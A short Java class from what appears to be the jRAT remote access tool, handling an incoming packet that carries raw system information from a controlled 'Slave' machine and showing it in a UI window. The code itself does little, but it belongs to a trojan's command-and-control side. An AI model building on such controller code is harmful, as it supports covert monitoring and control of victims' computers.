package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.ui.frames.FrameRawSystemInfo;

public class Packet57RawComputerInfo extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String info = slave.readLine();

		FrameRawSystemInfo frame = FrameRawSystemInfo.instances.get(slave);

		if (frame != null) {
			frame.append(info);
		}
	}

}
